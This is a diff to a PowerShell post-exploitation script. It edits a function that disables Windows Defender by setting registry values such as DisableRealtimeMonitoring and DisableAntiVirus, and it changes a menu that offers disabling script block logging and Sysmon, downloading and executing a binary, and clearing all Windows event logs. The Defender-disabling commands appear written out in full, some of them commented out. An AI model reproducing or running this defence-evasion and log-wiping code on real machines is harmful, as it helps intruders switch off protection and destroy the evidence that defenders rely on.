@@ -366,18 +366,18 @@ Function Disable-WindowsDefender
 	$releaseid = (get-itemproperty -path "hklm:\software\microsoft\windows nt\currentversion" -name releaseid).releaseid
 	if($releaseid -eq "1903")
 		{
-			if(test-path "hklm:\software\policies\microsoft\windows defender")
-				{
-					#set options that will disable windows defender scanning and protection
-					set-itemproperty -path "hklm:\software\microsoft\windows defender\real-time protection" -name DisableRealtimeMonitoring -value 1
-					set-itemproperty -path "hklm:\software\microsoft\windows defender" -name DisableAntiSpyware -value 1
-					set-itemproperty -path "hklm:\software\microsoft\windows defender" -name DisableAntiVirus -value 1
-					echo "* Windows Defender has been disabled."
+			echo "Current Windows Build 1903 - cannot disable Windows Defender."
+			#if(test-path "hklm:\software\policies\microsoft\windows defender")
+			#	{
+					#set options that will disable windows defender scanning and protection - these are the location for 1903 but require further permission tweaks I have left them here for future development
+					#set-itemproperty -path "hklm:\software\microsoft\windows defender\real-time protection" -name DisableRealtimeMonitoring -value 1
+					#set-itemproperty -path "hklm:\software\microsoft\windows defender" -name DisableAntiSpyware -value 1
+					#set-itemproperty -path "hklm:\software\microsoft\windows defender" -name DisableAntiVirus -value 1
 				}
-			else	
-				{
-					echo " ! Windows Defender registry key does not exist !"
-				}
+			#else	
+			#	{
+			#		echo " ! Windows Defender registry key does not exist !"
+			#	}
 		}
 	#assumes 1809 release as windows defender registry keys are in different locations	
 	else
@@ -410,7 +410,7 @@ function Display-PostExploitationMenu
 	Write-Host " 1: Press '1' Check for Internet Access - warning leaves network logs."
 	Write-Host " 2: Press '2' Disable Powershell Script Block Logging."
 	Write-Host " 3: Press '3' Disable Sysmon."
-	Write-Host " 4: Press '4' Disable Windows Defender."
+	Write-Host " 4: Press '4' Disable Windows Defender (1809 Only)."
 	Write-Host " 5: Press '5' Download and execute a binary (cmd.exe)."
 	Write-Host " 6: Press '6' Clear all Windows eventlogs."
 	Write-Host " 7: Press '7' Execution all post exploitation actions."
